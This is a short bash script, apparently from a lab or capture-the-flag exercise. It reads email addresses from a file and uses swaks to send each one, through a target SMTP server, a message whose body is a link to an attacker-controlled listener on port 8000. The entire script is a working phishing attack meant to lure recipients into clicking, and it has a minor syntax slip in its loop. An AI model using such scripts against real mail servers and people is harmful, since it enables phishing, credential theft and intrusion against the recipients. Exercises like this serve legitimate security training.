#!/bin/bash

for i in $(cat team_emails.txt):
do
	name=$(echo $i | cut -d "@" -f 1)
	echo -e "\e[1;33m Trying: $name \e[0m"
	swaks --to $i --server 10.10.10.197 --body "http://10.10.14.27:8000"
	echo
done
